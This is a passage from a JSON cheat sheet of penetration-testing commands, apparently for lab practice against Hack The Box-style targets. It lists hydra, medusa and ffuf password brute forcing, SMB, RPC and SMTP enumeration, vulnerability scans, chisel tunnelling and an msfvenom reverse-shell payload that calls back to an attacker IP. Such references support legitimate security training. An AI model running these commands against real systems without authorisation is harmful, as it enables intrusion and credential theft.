      "Command": "hydra -l tyler -P /usr/share/wordlists/rockyou.txt 10.10.10.97 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=valid\""
    },
    {
      "Name": "hydra",
      "Category": 4,
      "Description": "Brute force ssh with a wordlist",
      "Command": "hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201"
    },
    {
      "Name": "hydra",
      "Category": 4,
      "Description": "Brute force rdp with a wordlist",
      "Command": "hydra -l 'daniel' -P /usr/share/wordlists/rockyou.txt rdp://192.168.213.202"
    },
    {
      "Name": "nxc",
      "Category": 4,
      "Description": "Brute force rdp with a wordlist using nxc",
      "Command": "nxc rdp 192.168.XXX.227 -u nadine -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding"
    },
    {
      "Name": "hydra",
      "Category": 4,
      "Description": "Brute force basic auth with a wordlist",
      "Command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.213.201 http-get"
    },
    {
      "Name": "ffuf Brute",
      "Category": 4,
      "Description": "Brute force with ffuf",
      "Command": "ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ -u \"http://10.10.11.24:8008/ghost/api/admin/session\" -X POST -d '{\"username\":\"htbuserFUZZ\",\"password\":\"secret\"}' -H \"Host: 10.10.11.24:8008\" -H \"Accept: text/plain, */*; q=0.01\" -H \"X-Forwarded-For: htbuserFUZZ\" -H \"X-Requested-With: XMLHttpRequest\" -H \"X-Ghost-Version: 5.78\" -H \"App-Pragma: no-cache\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36\" -H \"Content-Type: application/json;charset=UTF-8\" -H \"Origin: http://10.10.11.24:8008\" -H \"Referer: http://10.10.11.24:8008/ghost/\" -H \"Accept-Encoding: gzip, deflate, br\" -H \"Accept-Language: en-US,en;q=0.9\" -H \"Cookie: connect.sid=s%3Av28_oZV8lijLRwlgUQWxt6ccnksDKouo.sb4qxncwYoE0dnj3ARiTb8OnJitRF%2FvDttKjE0nSX%2FM\" -H \"Connection: close\" -mr \"There is no user with that email address.\""
    },
    {
      "Name": "wfuzz Brute",
      "Category": 4,
      "Description": "Brute force with wfuzz",
      "Command": "wfuzz -z range,1-100000 -d \"username=htbuserFUZZ&password=secret\" -H \"X-Forwarded-For: htbuserFUZZ\" --hs \"There is no user with that email address.\" -u \"http://10.10.11.24:8008/ghost/api/admin/session\""
    },
    {
      "Name": "nikto",
      "Category": 5,
      "Description": "Vulnerability scanning with nikto",
      "Command": "nikto -h http://targetip:targetport"
    },
    {
      "Name": "nmap Vuln",
      "Category": 5,
      "Description": "Vulnerability scanning with nmap scripts",
      "Command": "nmap --script-help=http* -v 10.10.10.11"
    },
    {
      "Name": "wpscan",
      "Category": 5,
      "Description": "WordPress security scanner",
      "Command": "wpscan --url http://10.10.10.11/pathtowordpress/"
    },
    {
      "Name": "ffuf Subdomain",
      "Category": 6,
      "Description": "Subdomain enumeration with ffuf",
      "Command": "ffuf -u http://DOMAIN -w wordlist.txt -H \"Host: FUZZ.DOMAIN\" -s"
    },
    {
      "Name": "wfuzz Subdomain",
      "Category": 6,
      "Description": "Subdomain enumeration with wfuzz",
      "Command": "wfuzz -c -z file,/path/to/wordlist.txt -H \"Host: FUZZ.target-site.com\" --hw 0 http://target-site.com"
    },
    {
      "Name": "enum4linux",
      "Category": 7,
      "Description": "SMB enumeration",
      "Command": "enum4linux -a 10.10.11.24"
    },
    {
      "Name": "smbclient",
      "Category": 7,
      "Description": "List SMB shares",
      "Command": "smbclient -L \\\\10.10.11.24 -U anonymous"
    },
    {
      "Name": "nmap SMB",
      "Category": 7,
      "Description": "SMB vulnerability scan",
      "Command": "nmap --script smb-vuln* -p 445 10.10.11.24"
    },
    {
      "Name": "smbmap",
      "Category": 7,
      "Description": "SMB share mapping",
      "Command": "smbmap -H 10.10.11.24 -u guest -p \"\""
    },
    {
      "Name": "medusa SMB",
      "Category": 7,
      "Description": "Brute force SMB with medusa",
      "Command": "medusa -h 10.10.11.24 -u administrator -P /usr/share/wordlists/rockyou.txt -M smbnt -F"
    },
    {
      "Name": "hydra SMB",
      "Category": 7,
      "Description": "Brute force SMB with hydra",
      "Command": "hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.24 smb"
    },
    {
      "Name": "ncrack SMB",
      "Category": 7,
      "Description": "Brute force SMB with ncrack",
      "Command": "ncrack -p 445 -u blake -P /usr/share/wordlists/rockyou.txt smb://10.10.11.16"
    },
    {
      "Name": "nmap RPC",
      "Category": 7,
      "Description": "RPC enumeration with nmap",
      "Command": "nmap -sS -sV -p 135,139,445 --script=rpc-enum* 10.10.11.2"
    },
    {
      "Name": "rpcclient",
      "Category": 7,
      "Description": "RPC client enumeration",
      "Command": "rpcclient -U \"\" 10.10.11.24"
    },
    {
      "Name": "smtp-user-enum",
      "Category": 7,
      "Description": "SMTP user enumeration",
      "Command": "smtp-user-enum -M VRFY -U /usr/share/wordlists/rockyou.txt -t 10.10.11.14"
    },
    {
      "Name": "medusa SMTP",
      "Category": 7,
      "Description": "Brute force SMTP with medusa",
      "Command": "medusa -h target-server -u username -P /path/to/passwords.txt -M smtp -n 25"
    },
    {
      "Name": "dig",
      "Category": 7,
      "Description": "DNS record lookup",
      "Command": "dig <domain> -t any"
    },
    {
      "Name": "msfvenom Windows",
      "Category": 8,
      "Description": "Generate Windows reverse shell payload",
      "Command": "msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f aspx -o rshell443.aspx"
    },
    {
      "Name": "chisel",
      "Category": 9,
      "Description": "Port forwarding with chisel",
      "Command": "chisel server --port $PORT --proxy http://example.com"
    }
  ]
}